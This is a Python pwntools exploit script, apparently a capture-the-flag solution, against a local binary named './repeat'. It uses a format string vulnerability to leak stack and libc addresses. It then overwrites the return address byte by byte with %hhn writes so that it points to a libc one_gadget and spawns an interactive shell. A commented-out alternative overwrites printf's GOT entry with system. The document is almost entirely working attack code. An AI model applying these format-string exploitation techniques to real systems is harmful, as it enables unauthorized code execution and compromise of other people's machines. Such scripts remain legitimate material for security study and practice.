from pwn import *
context.binary = ELF('./repeat')
context.log_level = 'debug'

elf = context.binary
libc = elf.libc

def dbg():
    gdb.attach(p, "b* 0x4007e4")
    raw_input("dbg")

def exploit():

    # leak stack addr  & libc
    payload = "w%13$p.%19$pg"
    dbg()
    p.sendafter(">> ", payload)
    p.recvuntil("w")
    stack_addr = p.recvuntil('.', drop=True)
    stack_addr = int(stack_addr, 16)
    libc_start_addr = p.recvuntil('g', drop=True)
    libc_start_addr = int(libc_start_addr, 16) - 240

    print("stack_addr: ", hex(stack_addr))
    print("libc_start_main: ", hex(libc_start_addr))

    libc.address = libc_start_addr - libc.symbols['__libc_start_main']
    print("libc.address: ", hex(libc.address))

    system_addr = libc.symbols['system']

    # write printf's got ==> system
    # printf 
    '''
    low_byte = system_addr & 0xff
    middle_byte = (system_addr >> 8) & 0xff
    high_byte = (system_addr >> 16) & 0xff

    printf_got = elf.got['printf']

    payload = p64(printf_got)
    payload += p64(printf_got + 1)
    payload += p64(printf_got + 2)

    payload += "%{}c%8$hhn".format(low_byte)
    if middle_byte > low_byte:
        payload += "%{}c%9$hhn".format(middle_byte - low_byte)
    else:
        payload += "%{}c%9$hhn".format(0x100+middle_byte - low_byte)

    if high_byte > (middle_byte+low_byte):
        payload += "%{}c%10$hhn".format(high_byte - middle_byte - low_byte)
    else:
        payload += "%{}c%10$hhn".format(0x100 + high_byte - middle_byte - low_byte)


    #payload = fmtstr_payload(8, {printf_got:system_addr})
    payload = "a"*0x10
    payload = p64(printf_got)
    payload += "%8$p"#.format(0x22)
    p.sendafter('>> ', payload)
    #p.sendafter(">> ", payload)

    p.sendafter(">> ", "/bin/sh")
    '''
    return_addr = stack_addr + 8
    gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
    # stack povit
    for i in range(6): 
        payload = "%{}c%13$hhn".format((return_addr + i) & 0xff)
        p.sendafter(">> ", payload)
        payload = "%{}c%16$hhn".format(((libc.address + gadgets[0]) >> (8*i)) & 0xff)
        p.sendafter(">> ", payload)

    p.sendafter(">> ", "quit")
    p.interactive()
    p.close()

if __name__ == '__main__':
    p = process('./repeat')
    exploit()